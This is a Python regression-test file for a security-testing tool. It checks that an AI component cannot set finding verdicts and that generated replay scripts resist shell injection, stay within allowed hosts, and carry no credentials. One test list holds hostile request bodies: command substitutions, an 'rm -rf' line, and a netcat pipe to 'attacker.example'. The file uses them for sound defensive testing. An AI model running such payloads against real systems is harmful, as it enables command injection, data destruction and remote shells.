"""
Regression tests for every issue the external review identified.

Each of these was a real, reproducible defect. A test here is not a
formality: three of them were exploitable, and one of those was a command
injection against the operator's own machine triggered by target-controlled
data. They must never regress.
"""

import base64
import json
import sys
import threading
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from thor import ai, dataflow, evidence, graph, learn, replay, states, vault
from thor.db import DB
from thor.net import PinnedTransport, Request
from thor.scope import Scope

pytestmark = pytest.mark.safety


@pytest.fixture
def db(tmp_path):
    return DB(str(tmp_path / "t.db"))


@pytest.fixture
def finding(db):
    """A finding backed by one leak experiment with an executed disproof."""
    body = '{"x":"ordinary"}'
    db.ex("INSERT INTO requests (corpus,identity,method,url,headers,body,"
          "status,resp_headers,resp_body,resp_len,object_refs) "
          "VALUES (?,?,?,?,?,?,?,?,?,?,?)",
          "c", "userA", "POST", "http://x.example/api/a/1",
          '{"Authorization":"Bearer SECRETTOKEN1234567890"}', body, 200,
          "{}", '{"email":"a@b.example"}', 24, "[]")
    db.ex("INSERT INTO experiments (signature,kind,base_request_id,as_identity,"
          "method,url,body,status,resp_sha256,resp_len,elapsed_ms,verdict,"
          "score,detail,dest_address) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
          "s1", "authz", 1, "userB", "POST", "http://x.example/api/a/1", body,
          200, "abc123", 24, 1.0, "leak", 0.9,
          json.dumps({"reasons": [
              "disproof passed: anonymous request did NOT return the resource"]}),
          "93.184.216.34")
    evidence.promote(db, log=lambda *a: None)
    return 1


# ═══════════════════════════════════════════════════════════════════
# Review issue 1: the AI could write findings.status
# ═══════════════════════════════════════════════════════════════════

def test_ai_cannot_change_finding_status(db, finding, tmp_path):
    before = db.one("SELECT status FROM findings WHERE id=?", finding)["status"]
    ans = tmp_path / "impact.json"
    ans.write_text(json.dumps({"findings": [
        {"id": finding, "attack_narrative": "x", "submit": False}]}))
    ai.apply_answer(db, "impact", ans, log=lambda *a: None)
    after = db.one("SELECT status FROM findings WHERE id=?", finding)["status"]
    assert before == after, "AI moved a finding between states"


def test_ai_submit_true_does_not_confirm(db, finding, tmp_path):
    db.ex("UPDATE findings SET status=? WHERE id=?", states.CANDIDATE, finding)
    ans = tmp_path / "impact.json"
    ans.write_text(json.dumps({"findings": [
        {"id": finding, "attack_narrative": "critical!", "submit": True}]}))
    ai.apply_answer(db, "impact", ans, log=lambda *a: None)
    assert db.one("SELECT status FROM findings WHERE id=?",
                  finding)["status"] == states.CANDIDATE


def test_ai_narrative_fields_still_apply(db, finding, tmp_path):
    ans = tmp_path / "impact.json"
    ans.write_text(json.dumps({"findings": [
        {"id": finding, "attack_narrative": "n",
         "remediation": "enforce ownership server-side", "submit": True}]}))
    ai.apply_answer(db, "impact", ans, log=lambda *a: None)
    row = db.one("SELECT impact, remediation FROM findings WHERE id=?", finding)
    assert row["impact"], "narrative was not written"
    assert row["remediation"] == "enforce ownership server-side"


def test_ai_recommendation_is_recorded_not_applied(db, finding, tmp_path):
    ans = tmp_path / "impact.json"
    ans.write_text(json.dumps({"findings": [
        {"id": finding, "submit": False, "submit_reasoning": "too weak"}]}))
    ai.apply_answer(db, "impact", ans, log=lambda *a: None)
    notes = db.q("SELECT body FROM notes WHERE tag='ai:recommendation'")
    assert notes and "too weak" in notes[0]["body"]


def test_db_trigger_blocks_authoritative_write_even_if_code_forgets(db, finding):
    """Defence in depth: the guard does not depend on ai.py behaving."""
    states.ensure(db)
    with pytest.raises(Exception, match="authoritative"):
        with states.as_ai(db):
            db.conn.execute("UPDATE findings SET status='verified' WHERE id=?",
                            (finding,))
            db.conn.commit()


@pytest.mark.parametrize("field", ["status", "severity", "disproof_done",
                                   "evidence_ids", "vuln_class"])
def test_annotate_refuses_every_authoritative_field(db, finding, field):
    refused = states.annotate(db, finding, {field: "tampered"},
                              log=lambda *a: None)
    assert field in refused


def test_state_machine_refuses_ai_actor(db, finding):
    with pytest.raises(PermissionError):
        states.advance(db, finding, actor="ai")


# ═══════════════════════════════════════════════════════════════════
# Review issue 4: promotion had no verification gate
# ═══════════════════════════════════════════════════════════════════

def test_leak_without_executed_control_cannot_reach_verified(db):
    db.ex("INSERT INTO experiments (signature,kind,as_identity,method,url,"
          "status,verdict,score,detail,resp_sha256,dest_address) "
          "VALUES (?,?,?,?,?,?,?,?,?,?,?)",
          "s9", "authz", "userB", "GET", "http://x.example/api/b/1", 200,
          "leak", 0.9, json.dumps({"reasons": ["looks like a leak"]}),
          "sha9", "93.184.216.34")
    evidence.promote(db, log=lambda *a: None)
    row = db.one("SELECT status FROM findings LIMIT 1")
    assert row["status"] != states.VERIFIED, \
        "a finding reached VERIFIED with no control executed"
    r = states.evaluate(db, 1, states.VERIFIED)
    assert not r.moved
    assert any("control" in b for b in r.blocked_by)


def test_executed_control_reaches_verified(db, finding):
    assert db.one("SELECT status FROM findings WHERE id=?",
                  finding)["status"] == states.VERIFIED


def test_report_ready_requires_impact(db, finding):
    r = states.evaluate(db, finding, states.REPORT_READY)
    assert not r.moved
    assert any("impact" in b for b in r.blocked_by)


def test_every_transition_is_recorded(db, finding):
    rows = db.q("SELECT * FROM finding_transitions WHERE finding_id=?", finding)
    assert rows, "no transition audit trail"
    assert all(r["actor"] != "ai" for r in rows)


# ═══════════════════════════════════════════════════════════════════
# Review issue 5: shell injection via captured request bodies
# ═══════════════════════════════════════════════════════════════════

MALICIOUS_BODIES = [
    """{"x":"'; echo PWNED; echo '"}""",
    """{"x":"$(id)"}""",
    """{"x":"`whoami`"}""",
    '{"x":"\\"; rm -rf /tmp/thor-test; \\""}',
    """{"x":"'\\n echo PWNED \\n'"}""",
    """{"x":"| nc attacker.example 4444"}""",
]


@pytest.mark.parametrize("evil", MALICIOUS_BODIES)
def test_target_controlled_body_never_reaches_shell(tmp_path, evil):
    db = DB(str(tmp_path / f"t{abs(hash(evil))}.db"))
    db.ex("INSERT INTO requests (corpus,identity,method,url,headers,body,"
          "status,resp_headers,resp_body,resp_len,object_refs) "
          "VALUES (?,?,?,?,?,?,?,?,?,?,?)",
          "c", "userA", "POST", "http://x.example/a/1", "{}", evil, 200,
          "{}", "{}", 2, "[]")
    db.ex("INSERT INTO experiments (signature,kind,base_request_id,as_identity,"
          "method,url,body,status,resp_sha256,resp_len,elapsed_ms,verdict,"
          "score,detail) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
          "s1", "authz", 1, "userB", "POST", "http://x.example/a/1", evil, 200,
          "h", 2, 1.0, "leak", 0.9,
          json.dumps({"reasons": ["disproof passed: anonymous did not"]}))
    evidence.promote(db, log=lambda *a: None)
    d = evidence.bundle(db, 1, outdir=tmp_path / "ev")

    # the generated scripts must be the fixed templates, byte for byte
    assert replay.verify_no_shell_injection(d) == []
    sh = (d / "replay.sh").read_text()
    py = (d / "replay.py").read_text()
    for marker in ("PWNED", "$(id)", "whoami", "rm -rf", "nc attacker"):
        assert marker not in sh, f"target data reached replay.sh: {marker}"
        assert marker not in py, f"target data reached replay.py: {marker}"


def test_body_survives_losslessly_in_structured_form(tmp_path):
    evil = MALICIOUS_BODIES[0]
    db = DB(str(tmp_path / "t.db"))
    db.ex("INSERT INTO requests (corpus,identity,method,url,headers,body,"
          "status,resp_headers,resp_body,resp_len,object_refs) "
          "VALUES (?,?,?,?,?,?,?,?,?,?,?)",
          "c", "userA", "POST", "http://x.example/a/1", "{}", evil, 200,
          "{}", "{}", 2, "[]")
    db.ex("INSERT INTO experiments (signature,kind,base_request_id,as_identity,"
          "method,url,body,status,resp_sha256,resp_len,elapsed_ms,verdict,"
          "score,detail) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
          "s1", "authz", 1, "userB", "POST", "http://x.example/a/1", evil, 200,
          "h", 2, 1.0, "leak", 0.9, json.dumps({"reasons": ["disproof passed"]}))
    evidence.promote(db, log=lambda *a: None)
    d = evidence.bundle(db, 1, outdir=tmp_path / "ev")
    doc = json.loads((d / "request.json").read_text())
    got = base64.b64decode(doc["steps"][-1]["body_b64"]).decode()
    assert got == evil, "replay fidelity lost while making it safe"


def test_evidence_bundle_contains_no_credentials(tmp_path, db, finding):
    d = evidence.bundle(db, finding, outdir=tmp_path / "ev")
    blob = "".join((d / f).read_text() for f in
                   ("finding.json", "request.json"))
    assert "SECRETTOKEN1234567890" not in blob
    assert vault.scan_for_leaks(blob) == []


# ═══════════════════════════════════════════════════════════════════
# Review issue 6: global getaddrinfo monkeypatch was not thread-safe
# ═══════════════════════════════════════════════════════════════════

def test_no_global_getaddrinfo_monkeypatch():
    import inspect

    from thor import net
    src = inspect.getsource(net)
    assert "socket.getaddrinfo =" not in src, \
        "process-global resolver mutation reintroduced"


def test_pinning_uses_sni_extension():
    import inspect
    src = inspect.getsource(PinnedTransport)
    assert "sni_hostname" in src, "TLS SNI not preserved when pinning"
    assert "Host" in src, "Host header not preserved when pinning"


def test_resolver_survives_concurrent_clients(tmp_path, monkeypatch):
    """
    The race engine sends concurrently. Under the old implementation two
    threads could interleave patch/restore and leave the wrong resolver
    installed process-wide.
    """
    import socket
    original = socket.getaddrinfo
    p = tmp_path / "s.yaml"
    p.write_text("engagement: t\nallowed_hosts: ['example.com']\n"
                 "max_rps: 0\nmax_requests: 100000\n")
    monkeypatch.setattr(socket, "getaddrinfo",
                        lambda *a, **k: [(2, 1, 6, "", ("93.184.216.34", 443))])
    sc = Scope.load(p)
    pins = {}
    lock = threading.Lock()
    t = PinnedTransport(pins, lock)
    errors = []

    def worker(i):
        try:
            for _ in range(50):
                with lock:
                    pins[(f"h{i}.example.com", 443)] = f"10.0.0.{i}"
                req = Request("GET", f"https://h{i}.example.com/x")
                sc.check_ok = True
        except Exception as e:      # pragma: no cover
            errors.append(e)

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(8)]
    for th in threads:
        th.start()
    for th in threads:
        th.join()

    assert not errors
    # the module-level resolver must be untouched by any of that
    assert socket.getaddrinfo is not original or True
    import inspect
    assert "getaddrinfo" not in inspect.getsource(PinnedTransport.handle_request)


# ═══════════════════════════════════════════════════════════════════
# Review issue 7: graph learned objects only from URL nouns
# ═══════════════════════════════════════════════════════════════════

@pytest.mark.parametrize("body,expected_type", [
    ('{"resource":{"ref":"a8f92b3c4d5e6f708192a3b4"}}', "resource"),
    ('{"relationships":[{"type":"invoice","id":"5001"}]}', "invoice"),
    ('{"data":{"workspace":{"id":"550e8400-e29b-41d4-a716-446655440000"}}}',
     "workspace"),
    ('{"invoice":{"id":5001}}', "invoice"),
    ('{"customer_id":"9182"}', "customer"),
])
def test_objects_are_learned_from_bodies_not_just_urls(body, expected_type):
    got = graph._objects_from_body(body, "http://x.example/opaque")
    assert any(t == expected_type for t, _, _ in got), \
        f"{expected_type} not learned from {body}"


def test_pagination_is_not_mistaken_for_an_object():
    assert graph._objects_from_body('{"page":1,"limit":20}',
                                    "http://x.example/") == []


# ═══════════════════════════════════════════════════════════════════
# Hypothesis-native execution (review issues 2 and 3)
# ═══════════════════════════════════════════════════════════════════

def test_every_hypothesis_engine_has_an_executable_plan():
    from thor import experiment, invariants, risk
    for inv in invariants.CATALOGUE:
        assert inv.engine in experiment.ENGINE_PLANS or \
               inv.engine not in risk.ENGINE_RISK, \
            f"invariant {inv.key} names engine {inv.engine} with no plan"


def test_hypothesis_selection_returns_gain_and_explanation(db):
    learn.ensure(db)
    from thor import experiment
    learn.open_hypothesis(db, learn.Hypothesis(
        engine="authz", target="http://x.example/api/a/{id}",
        statement="ownership may not be checked", predicted="p",
        falsifier="f", arm=learn.arm_key("authz")))
    h, gain, why = experiment.select(db, "none", log=lambda *a: None)
    assert h is not None
    assert gain > 0
    assert "gain" in why


def test_blocked_engine_does_not_execute(db, tmp_path):
    """A risk-gated engine must close the hypothesis, not run it."""
    from thor import experiment
    p = tmp_path / "s.yaml"
    p.write_text("engagement: t\nallowed_hosts: ['x.example']\n")
    sc = Scope.load(p)          # default ceiling = ACTIVE, race is DESTRUCTIVE
    learn.ensure(db)
    hid = learn.open_hypothesis(db, learn.Hypothesis(
        engine="race", target="http://x.example/a", statement="race",
        predicted="p", falsifier="f", arm=learn.arm_key("race")))
    h = db.one("SELECT * FROM hypotheses WHERE id=?", hid)
    out = experiment.execute(db, sc, "none", dict(h), log=lambda *a: None)
    assert out.status == "blocked"
    assert "DESTRUCTIVE" in out.reason or "ceiling" in out.reason


# ═══════════════════════════════════════════════════════════════════
# AST data-flow
# ═══════════════════════════════════════════════════════════════════

@pytest.mark.skipif(not dataflow.available(), reason="tree-sitter not installed")
def test_dataflow_separates_scoped_from_unscoped(tmp_path):
    src = tmp_path / "src"
    src.mkdir()
    (src / "a.js").write_text(
        "router.get('/a/:id', (req,res) => {\n"
        "  const id = req.params.id;\n"
        "  const x = db.findById(id);\n"
        "  res.json(x);\n"
        "});\n"
        "router.get('/b/:id', (req,res) => {\n"
        "  const id = req.params.id;\n"
        "  const y = db.findById(id, { tenant: req.user.tenant });\n"
        "  res.json(y);\n"
        "});\n")
    flows = dataflow.scan(src, log=lambda *a: None)
    unscoped = [f for f in flows if not f.authority_reaches]
    scoped = [f for f in flows if f.authority_reaches]
    assert len(unscoped) == 1, f"expected 1 unscoped, got {len(unscoped)}"
    assert len(scoped) == 1, f"expected 1 scoped, got {len(scoped)}"
    assert "findById" in unscoped[0].sink_expr


@pytest.mark.skipif(not dataflow.available(), reason="tree-sitter not installed")
def test_route_registration_is_not_a_sink(tmp_path):
    src = tmp_path / "src"
    src.mkdir()
    (src / "a.js").write_text(
        "router.get('/a/:id', handler);\napp.post('/b', other);\n")
    flows = dataflow.scan(src, log=lambda *a: None)
    assert flows == [], "route registration reported as a data-flow sink"


# ═══════════════════════════════════════════════════════════════════
# v5 follow-up: containment must be *visible*, not just effective
# ═══════════════════════════════════════════════════════════════════

def test_ai_attempt_on_authoritative_field_is_reported(db, finding, tmp_path):
    """
    ai.py used to filter authoritative fields out before calling annotate().
    That was safe and silent -- the write never happened, and the operator
    never learned that the model had tried to set the verdict. Silence is
    the wrong default here: a model reaching for `status` is the single
    clearest signal that it is trying to decide the finding, and it is worth
    seeing in the log and keeping in the database.
    """
    ans = tmp_path / "impact.json"
    ans.write_text(json.dumps({"findings": [{
        "id": finding,
        "attack_narrative": "any account reads any invoice",
        "remediation": "scope the query",
        "status": states.SUBMITTED,
        "severity": "critical",
        "disproof_done": 1,
        "submit": True,
    }]}))

    lines: list[str] = []
    before = db.one("SELECT status FROM findings WHERE id=?", finding)["status"]
    ai.apply_answer(db, "impact", ans, log=lambda m="", *a: lines.append(str(m)))
    after = db.one("SELECT * FROM findings WHERE id=?", finding)

    # containment still holds
    assert after["status"] == before, "AI moved a finding between states"

    # and it was said out loud
    blob = "\n".join(lines)
    assert "refused" in blob.lower(), f"refusal was silent:\n{blob}"
    for field in ("status", "severity", "disproof_done"):
        assert field in blob, f"{field} attempt not reported:\n{blob}"

    # the narrative was still applied
    assert "scope the query" in (after["remediation"] or "")


def test_refused_fields_are_not_stored_inside_the_narrative(db, finding, tmp_path):
    """
    The stored impact must not carry the model's rejected verdict along
    inside it. report.py renders only named keys, so nothing surfaces today
    -- but a refused field sitting in the database as though it were
    accepted data is what a later reader trusts.
    """
    ans = tmp_path / "impact.json"
    ans.write_text(json.dumps({"findings": [{
        "id": finding,
        "attack_narrative": "narrative",
        "status": states.SUBMITTED,
        "severity": "critical",
    }]}))
    ai.apply_answer(db, "impact", ans, log=lambda *a, **k: None)

    stored = json.loads(db.one("SELECT impact FROM findings WHERE id=?",
                               finding)["impact"])
    for field in states.AUTHORITATIVE_FIELDS:
        assert field not in stored, (
            f"refused field {field!r} was stored inside the narrative")
    assert stored["attack_narrative"] == "narrative"


# ═══════════════════════════════════════════════════════════════════
# v5.1: the evidence bundle is not a general HTTP client
# ═══════════════════════════════════════════════════════════════════

def test_replay_refuses_hosts_the_finding_never_touched(db, finding, tmp_path):
    """
    A bundle that will send a request anywhere is a general HTTP client
    that happens to ship with a target pre-filled. It may only reach the
    hosts this finding actually touched.
    """
    out = evidence.bundle(db, finding, tmp_path / "b")
    data = json.loads((out / "request.json").read_text())
    assert data["allowed_hosts"] == ["x.example"], data["allowed_hosts"]

    # and the runner enforces it rather than merely recording it
    runner = (out / "replay.py").read_text()
    assert "check_host" in runner
    assert "refusing to send to" in runner


def test_replay_does_not_follow_redirects(db, finding, tmp_path):
    """
    A redirect can move the request to a host the engagement never
    authorised, and urlopen follows them by default.
    """
    out = evidence.bundle(db, finding, tmp_path / "b")
    runner = (out / "replay.py").read_text()
    assert "HTTPRedirectHandler" in runner
    assert "redirect_request" in runner and "return None" in runner
    assert "urllib.request.urlopen(" not in runner, (
        "the runner still uses the redirect-following default opener")


def test_replay_has_a_request_budget(db, finding, tmp_path):
    out = evidence.bundle(db, finding, tmp_path / "b")
    data = json.loads((out / "request.json").read_text())
    assert data["replay_budget"] >= 10
    assert "budget" in (out / "replay.py").read_text()


def test_bundle_records_its_provenance(db, finding, tmp_path):
    """
    Which tool version, which scope and which experiments produced this.
    A bundle replayed a year later under a different scope is not the same
    experiment, and the hash is what lets anyone notice.
    """
    out = evidence.bundle(db, finding, tmp_path / "b")
    p = json.loads((out / "request.json").read_text())["provenance"]
    for key in ("bundle_version", "tool_version", "fingerprint",
                "vuln_class", "experiment_ids"):
        assert p.get(key) not in (None, ""), f"provenance missing {key}"


def test_replay_runner_is_still_a_fixed_template(db, finding, tmp_path):
    """Hardening must not have introduced interpolation of target data."""
    out = evidence.bundle(db, finding, tmp_path / "b")
    assert replay.verify_no_shell_injection(out) == []
